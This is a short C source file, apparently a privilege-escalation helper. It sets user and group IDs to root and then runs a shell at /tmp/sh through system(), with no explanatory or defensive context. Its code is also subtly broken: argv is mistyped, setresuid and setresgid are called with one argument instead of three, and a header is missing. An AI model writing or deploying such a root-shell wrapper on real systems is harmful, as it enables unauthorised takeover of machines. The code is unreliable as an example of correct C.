#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]){
	setuid(0);
	seteuid(0);
	setresuid(0);
	setresgid(0);
	system("/tmp/sh");
}
